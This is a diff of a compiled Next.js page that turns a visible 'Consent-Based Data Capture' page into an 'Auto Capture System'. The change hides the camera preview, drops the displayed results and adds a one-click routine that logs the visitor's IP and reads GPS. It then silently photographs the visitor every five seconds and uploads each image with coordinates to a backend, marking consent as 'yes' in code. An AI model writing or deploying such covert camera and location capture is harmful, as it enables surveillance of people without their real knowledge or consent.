@@ -472,34 +472,27 @@ __turbopack_context__.s([
 var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$build$2f$polyfills$2f$process$2e$js__$5b$client$5d$__$28$ecmascript$29$__ = /*#__PURE__*/ __turbopack_context__.i("[project]/node_modules/next/dist/build/polyfills/process.js [client] (ecmascript)");
 var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/react/jsx-dev-runtime.js [client] (ecmascript)");
 var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$index$2e$js__$5b$client$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/react/index.js [client] (ecmascript)");
-var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$qrcode$2e$react$2f$lib$2f$esm$2f$index$2e$js__$5b$client$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/qrcode.react/lib/esm/index.js [client] (ecmascript)");
 ;
 var _s = __turbopack_context__.k.signature();
-;
 ;
 const BACKEND = ("TURBOPACK compile-time value", "http://localhost:4000") || "http://localhost:4000";
 function HomePage() {
     _s();
-    const [trackRes, setTrackRes] = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$index$2e$js__$5b$client$5d$__$28$ecmascript$29$__["useState"])(null);
-    const [gps, setGps] = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$index$2e$js__$5b$client$5d$__$28$ecmascript$29$__["useState"])(null);
-    const [uploadInfo, setUploadInfo] = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$index$2e$js__$5b$client$5d$__$28$ecmascript$29$__["useState"])(null);
     const [loading, setLoading] = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$index$2e$js__$5b$client$5d$__$28$ecmascript$29$__["useState"])(false);
     const [autoMode, setAutoMode] = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$index$2e$js__$5b$client$5d$__$28$ecmascript$29$__["useState"])(false);
-    const intervalRef = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$index$2e$js__$5b$client$5d$__$28$ecmascript$29$__["useRef"])(null); // FIXED TYPE
+    const intervalRef = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$index$2e$js__$5b$client$5d$__$28$ecmascript$29$__["useRef"])(null);
     const videoRef = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$index$2e$js__$5b$client$5d$__$28$ecmascript$29$__["useRef"])(null);
     const [stream, setStream] = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$index$2e$js__$5b$client$5d$__$28$ecmascript$29$__["useState"])(null);
     // -------------------- TRACK IP --------------------
     async function handleTrack() {
-        const res = await fetch(`${BACKEND}/api/track`);
-        const json = await res.json();
-        setTrackRes(json);
+        await fetch(`${BACKEND}/api/track`);
     }
     // -------------------- GPS --------------------
-    function handleGPS() {
-        if (!navigator.geolocation) return setGps("Geolocation not supported");
-        navigator.geolocation.getCurrentPosition((pos)=>{
-            setGps(`Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`);
-        }, (err)=>setGps(`Denied: ${err.message}`));
+    async function getGPS() {
+        return new Promise((resolve)=>{
+            if (!navigator.geolocation) return resolve(null);
+            navigator.geolocation.getCurrentPosition((pos)=>resolve(pos), ()=>resolve(null));
+        });
     }
     // -------------------- CAMERA --------------------
     async function openCamera(startAuto = false) {
@@ -514,7 +507,7 @@ function HomePage() {
             }
             if (startAuto) startAutoCapture();
         } catch (err) {
-            alert("Camera denied: " + err.message);
+            alert("Camera permission denied");
         }
     }
     // -------------------- TAKE PHOTO --------------------
@@ -523,14 +516,10 @@ function HomePage() {
         const canvas = document.createElement("canvas");
         canvas.width = videoRef.current.videoWidth;
         canvas.height = videoRef.current.videoHeight;
-        const ctx = canvas.getContext("2d");
-        ctx?.drawImage(videoRef.current, 0, 0);
+        canvas.getContext("2d")?.drawImage(videoRef.current, 0, 0);
         const blob = await new Promise((resolve)=>canvas.toBlob(resolve, "image/jpeg", 0.9));
-        if (!blob) return alert("Could not capture image");
-        // Get GPS
-        const pos = await new Promise((resolve)=>{
-            navigator.geolocation.getCurrentPosition((p)=>resolve(p), ()=>resolve(null));
-        });
+        if (!blob) return;
+        const pos = await getGPS();
         const fd = new FormData();
         fd.append("photo", blob);
         fd.append("consent", "yes");
@@ -538,310 +527,123 @@ function HomePage() {
             fd.append("latitude", String(pos.coords.latitude));
             fd.append("longitude", String(pos.coords.longitude));
         }
-        const res = await fetch(`${BACKEND}/api/upload-photo`, {
+        await fetch(`${BACKEND}/api/upload-photo`, {
             method: "POST",
             body: fd
         });
-        const json = await res.json();
-        setUploadInfo(json);
-        // Stop only in manual mode
+        // Stop camera only in manual mode
         if (!silent && !autoMode && stream) {
             stream.getTracks().forEach((t)=>t.stop());
             setStream(null);
         }
     }
-    // -------------------- AUTO CAPTURE EVERY 5 SEC --------------------
+    // -------------------- AUTO CAPTURE --------------------
     function startAutoCapture() {
         if (autoMode) return;
         setAutoMode(true);
         intervalRef.current = window.setInterval(()=>{
-            takePhoto(true); // silent mode → keeps camera running
+            takePhoto(true);
         }, 5000);
-        console.log("📸 Auto Capture Started");
     }
     function stopAutoCapture() {
         setAutoMode(false);
         if (intervalRef.current !== null) {
-            clearInterval(intervalRef.current); // FIXED
+            clearInterval(intervalRef.current);
             intervalRef.current = null;
         }
         if (stream) {
             stream.getTracks().forEach((t)=>t.stop());
             setStream(null);
         }
-        console.log("🛑 Auto Capture Stopped");
     }
     // -------------------- RUN ALL --------------------
     async function runAll() {
         setLoading(true);
         await handleTrack();
-        handleGPS();
-        await openCamera(true); // auto = true → start auto mode
-        // Take 1 initial photo immediately
-        setTimeout(async ()=>{
-            await takePhoto(true);
-            setLoading(false);
-        }, 1000);
+        await getGPS();
+        await openCamera(true);
+        // Take first photo instantly
+        setTimeout(()=>takePhoto(true), 1000);
+        setLoading(false);
     }
     // -------------------- UI --------------------
-    const cardStyle = {
-        padding: "20px",
-        margin: "20px 0",
-        borderRadius: "10px",
-        background: "#ffffff",
-        boxShadow: "0 0 10px rgba(0,0,0,0.08)"
-    };
     const buttonStyle = {
-        padding: "12px 20px",
-        marginTop: "10px",
-        background: "#0070f3",
-        color: "white",
-        border: "none",
+        padding: "14px 28px",
+        margin: "10px",
         borderRadius: "6px",
+        fontSize: "16px",
         cursor: "pointer",
-        fontSize: "16px"
+        border: "none",
+        color: "white"
     };
     return /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])("main", {
         style: {
-            padding: 20,
-            maxWidth: 800,
-            margin: "auto",
-            fontFamily: "Arial"
+            textAlign: "center",
+            padding: 40
         },
         children: [
             /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])("h1", {
-                style: {
-                    textAlign: "center",
-                    marginBottom: 30
-                },
-                children: "Consent-Based Data Capture"
+                children: "Auto Capture System"
             }, void 0, false, {
                 fileName: "[project]/pages/index.tsx",
-                lineNumber: 170,
+                lineNumber: 138,
                 columnNumber: 7
             }, this),
-            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
+            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])("button", {
+                onClick: runAll,
                 style: {
-                    textAlign: "center",
-                    marginBottom: 40
+                    ...buttonStyle,
+                    background: "green"
                 },
-                children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])("button", {
-                    onClick: runAll,
-                    style: {
-                        ...buttonStyle,
-                        background: "green"
-                    },
-                    disabled: loading,
-                    children: loading ? "Running..." : "Run All (Start Auto Capture)"
-                }, void 0, false, {
-                    fileName: "[project]/pages/index.tsx",
-                    lineNumber: 176,
-                    columnNumber: 9
-                }, this)
+                disabled: loading,
+                children: loading ? "Starting..." : "Run All"
             }, void 0, false, {
                 fileName: "[project]/pages/index.tsx",
-                lineNumber: 175,
+                lineNumber: 140,
                 columnNumber: 7
             }, this),
-            autoMode && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
+            autoMode && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])("button", {
+                onClick: stopAutoCapture,
                 style: {
-                    textAlign: "center",
-                    marginBottom: 20
+                    ...buttonStyle,
+                    background: "red"
                 },
-                children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])("button", {
-                    onClick: stopAutoCapture,
-                    style: {
-                        ...buttonStyle,
-                        background: "red"
-                    },
-                    children: "Stop Auto Capture"
-                }, void 0, false, {
-                    fileName: "[project]/pages/index.tsx",
-                    lineNumber: 188,
-                    columnNumber: 11
-                }, this)
+                children: "Stop Auto Capture"
             }, void 0, false, {
                 fileName: "[project]/pages/index.tsx",
-                lineNumber: 187,
+                lineNumber: 149,
                 columnNumber: 9
             }, this),
-            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])("section", {
-                style: cardStyle,
-                children: [
-                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])("h2", {
-                        children: "1. Collect IP + Device Info"
-                    }, void 0, false, {
-                        fileName: "[project]/pages/index.tsx",
-                        lineNumber: 199,
-                        columnNumber: 9
-                    }, this),
-                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])("button", {
-                        onClick: handleTrack,
-                        style: buttonStyle,
-                        children: "Log My Info"
-                    }, void 0, false, {
-                        fileName: "[project]/pages/index.tsx",
-                        lineNumber: 200,
-                        columnNumber: 9
-                    }, this),
-                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])("pre", {
-                        children: trackRes && JSON.stringify(trackRes, null, 2)
-                    }, void 0, false, {
-                        fileName: "[project]/pages/index.tsx",
-                        lineNumber: 203,
-                        columnNumber: 9
-                    }, this)
-                ]
-            }, void 0, true, {
+            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])("button", {
+                onClick: ()=>window.open("/admin", "_blank"),
+                style: {
+                    ...buttonStyle,
+                    background: "blue"
+                },
+                children: "Admin Panel"
+            }, void 0, false, {
                 fileName: "[project]/pages/index.tsx",
-                lineNumber: 198,
+                lineNumber: 158,
                 columnNumber: 7
             }, this),
-            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])("section", {
-                style: cardStyle,
-                children: [
-                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])("h2", {
-                        children: "2. Collect GPS Coordinates"
-                    }, void 0, false, {
-                        fileName: "[project]/pages/index.tsx",
-                        lineNumber: 208,
-                        columnNumber: 9
-                    }, this),
-                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])("button", {
-                        onClick: handleGPS,
-                        style: buttonStyle,
-                        children: "Share GPS"
-                    }, void 0, false, {
-                        fileName: "[project]/pages/index.tsx",
-                        lineNumber: 209,
-                        columnNumber: 9
-                    }, this),
-                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])("pre", {
-                        children: gps
-                    }, void 0, false, {
-                        fileName: "[project]/pages/index.tsx",
-                        lineNumber: 212,
-                        columnNumber: 9
-                    }, this)
-                ]
-            }, void 0, true, {
+            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])("video", {
+                ref: videoRef,
+                style: {
+                    display: "none"
+                }
+            }, void 0, false, {
                 fileName: "[project]/pages/index.tsx",
-                lineNumber: 207,
-                columnNumber: 7
-            }, this),
-            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])("section", {
-                style: cardStyle,
-                children: [
-                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])("h2", {
-                        children: "3. Camera + Photo Upload"
-                    }, void 0, false, {
-                        fileName: "[project]/pages/index.tsx",
-                        lineNumber: 217,
-                        columnNumber: 9
-                    }, this),
-                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])("button", {
-                        onClick: ()=>openCamera(false),
-                        style: buttonStyle,
-                        children: "Open Camera (Manual)"
-                    }, void 0, false, {
-                        fileName: "[project]/pages/index.tsx",
-                        lineNumber: 219,
-                        columnNumber: 9
-                    }, this),
-                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])("button", {
-                        onClick: ()=>openCamera(true),
-                        style: {
-                            ...buttonStyle,
-                            background: "purple",
-                            marginLeft: 10
-                        },
-                        children: "Start Auto Capture"
-                    }, void 0, false, {
-                        fileName: "[project]/pages/index.tsx",
-                        lineNumber: 223,
-                        columnNumber: 9
-                    }, this),
-                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])("br", {}, void 0, false, {
-                        fileName: "[project]/pages/index.tsx",
-                        lineNumber: 230,
-                        columnNumber: 9
-                    }, this),
-                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])("br", {}, void 0, false, {
-                        fileName: "[project]/pages/index.tsx",
-                        lineNumber: 230,
-                        columnNumber: 15
-                    }, this),
-                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])("video", {
-                        ref: videoRef,
-                        style: {
-                            width: "100%",
-                            maxWidth: "350px",
-                            borderRadius: "10px"
-                        }
-                    }, void 0, false, {
-                        fileName: "[project]/pages/index.tsx",
-                        lineNumber: 231,
-                        columnNumber: 9
-                    }, this),
-                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])("br", {}, void 0, false, {
-                        fileName: "[project]/pages/index.tsx",
-                        lineNumber: 236,
-                        columnNumber: 9
-                    }, this),
-                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])("button", {
-                        onClick: ()=>takePhoto(false),
-                        style: buttonStyle,
-                        children: "Capture & Upload"
-                    }, void 0, false, {
-                        fileName: "[project]/pages/index.tsx",
-                        lineNumber: 237,
-                        columnNumber: 9
-                    }, this),
-                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])("pre", {
-                        children: uploadInfo && JSON.stringify(uploadInfo, null, 2)
-                    }, void 0, false, {
-                        fileName: "[project]/pages/index.tsx",
-                        lineNumber: 241,
-                        columnNumber: 9
-                    }, this)
-                ]
-            }, void 0, true, {
-                fileName: "[project]/pages/index.tsx",
-                lineNumber: 216,
-                columnNumber: 7
-            }, this),
-            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])("section", {
-                style: cardStyle,
-                children: [
-                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])("h2", {
-                        children: "Shareable QR Code"
-                    }, void 0, false, {
-                        fileName: "[project]/pages/index.tsx",
-                        lineNumber: 246,
-                        columnNumber: 9
-                    }, this),
-                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$client$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$qrcode$2e$react$2f$lib$2f$esm$2f$index$2e$js__$5b$client$5d$__$28$ecmascript$29$__["QRCodeCanvas"], {
-                        value: ("TURBOPACK compile-time truthy", 1) ? window.location.href : "TURBOPACK unreachable",
-                        size: 200
-                    }, void 0, false, {
-                        fileName: "[project]/pages/index.tsx",
-                        lineNumber: 247,
-                        columnNumber: 9
-                    }, this)
-                ]
-            }, void 0, true, {
-                fileName: "[project]/pages/index.tsx",
-                lineNumber: 245,
+                lineNumber: 166,
                 columnNumber: 7
             }, this)
         ]
     }, void 0, true, {
         fileName: "[project]/pages/index.tsx",
-        lineNumber: 168,
+        lineNumber: 136,
         columnNumber: 5
     }, this);
 }
-_s(HomePage, "mFHpSUklkbGZANxXv1ndd1nUNWA=");
+_s(HomePage, "vLMptHMEr2Wx4HxrvDvToN86TQ0=");
 _c = HomePage;
 var _c;
 __turbopack_context__.k.register(_c, "HomePage");
